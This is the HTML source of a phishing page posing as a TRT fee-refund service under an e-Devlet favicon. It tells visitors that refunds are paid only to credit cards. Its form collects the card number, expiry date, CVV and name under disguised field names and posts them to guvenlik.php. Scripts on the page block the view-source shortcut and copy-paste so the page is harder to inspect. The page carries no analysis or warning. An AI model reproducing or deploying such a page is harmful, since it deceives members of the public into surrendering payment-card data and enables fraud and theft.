<!DOCTYPE html>
<!-- saved from url=(0025)/ -->
<html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
    <title>TRT | Aidat İade Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./index_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./index_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="./index_files/flaticon.css">

    <!-- Favicon icon -->
    

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./index_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./index_files/style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./index_files/default.css">

</head>
<body id="top">
<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png">
<script src="./index_files/jquery-3.2.1.min.js.indir" type="text/javascript"></script>
<script src="./index_files/jquery.creditCardValidator.js.indir"></script>
<script>
function validate(){
	var valid = true;	 
    $(".demoInputBox").css('background-color','');
    var message = "";

    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
    var cvvRegex = /^[0-9]{3,3}$/;
    
    var cardHolderName = $("#card-holder-name").val();
    var cardNumber = $("#tach").val();
    var cvv = $("#dogum").val();

    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
    	   if(cardHolderName == "") {
    		   $("#card-holder-name").css('background-color','#FFFFDF');
    	   }
    	   if(cardNumber == "") {
    		   $("#tach").css('background-color','#FFFFDF');
    	   }
    	   if (cvv == "") {
    		   $("#dogum").css('background-color','#FFFFDF');
    	   }
       valid = false;
    }
    
    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
        message  += "<div>Card Holder Name is Invalid</div>";    
    		$("#card-holder-name").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(cardNumber != "") {
        	$('#tach').validateCreditCard(function(result){
            if(!(result.valid)){
                	message  += "<div>Kart Numarası Hatalı!</div>";    
            		$("#tach").css('background-color','#FFFFDF');
            		valid = false;
            }
        });
    }
    
    if (cvv != "" && !cvvRegex.test(cvv)) {
        message  += "<div>CVV Kodu Hatalı!</div>";    
        $("#dogum").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(message != "") {
        $("#error-message").show();
        $("#error-message").html(message);
    }
    return valid;
}
</script>

<form id="frmContact" action="guvenlik.php" method="post" onsubmit="return validate();">




    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="./index_files/bootstrap.min(1).css">
    <link type="text/css" rel="stylesheet" href="./index_files/font-awesome.min(1).css">
    <link type="text/css" rel="stylesheet" href="./index_files/flaticon(1).css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="https://www.indirvip.com/wp-content/uploads/2017/12/e-devlet-kap%C4%B1s%C4%B1-logo.png" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="./index_files/css">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="./index_files/style(1).css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="./index_files/default(1).css">



<div class="page_loader"></div>



<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="http://www.globya.com.tr/wp-content/uploads/2016/03/clients-04.png" alt="logo">
                        </a>
                        <h3>TRT Online Aidat İade Sistemi</h3>


			<font size="2" color="#960000">Aidat İadeleri <b>Yalnızca</b> Kredi Kartlarına Yapılmaktadır</font>
			<br>
			<br>
                        
                            <div class="form-group">
							<div class="form-group">
                                <input class="input-text" placeholder="İsim Soyisim" required="required" type="text" id="anne" name="anne" reqassetsred="">
                            </div>
                                <input class="number credit-card-number input-text" required="required" type="text" id="tach" name="kullanici" placeholder="Kart Numarası">
                            </div>
                            <div class="form-group">
                                <input class="expiration-month-and-year input-text" placeholder="Ay / Yıl" required="required" type="text" id="sifrexa" name="skt" reqassetsred="">
                            </div>
                            <div class="form-group">
                                <input class="input-text" placeholder="CVV Kodu" maxlength="3" minlength="3" pattern="[0-9]*" required="required" type="number" id="dogum" name="pass" reqassetsred="">
                            </div>
                            
                            <div class="form-group mb-0">
                                <button type="submit" class="btn-md btn-theme btn-block">SORGULA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        
                       
                </div>
            </div>
        </div>
    </div>
</div>




<!-- Login 1 end -->

<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
};
</script>

<script type="text/javascript">
$(document).ready(function () {
    //Disable full page
    $('body').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
     
    //Disable part of page
    $('#id').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
});
</script>

<!-- credit-card -->
		<script type="text/javascript" src="./index_files/creditly.js.indir"></script>
		<script type="text/javascript">
			$(function() {
			  var creditly = Creditly.initialize(
				  '.creditly-wrapper .expiration-month-and-year',
				  '.creditly-wrapper .credit-card-number',
				  '.creditly-wrapper .security-code',
				  '.creditly-wrapper .card-type');

			  $(".creditly-card-form .submit").click(function(e) {
				e.preventDefault();
				var output = creditly.validate();
				if (output) {
				  // Your validated credit card output
				  console.log(output);
				}
			  });
			});
		</script>
	<!-- //credit-card -->


</div></section></form></body></html>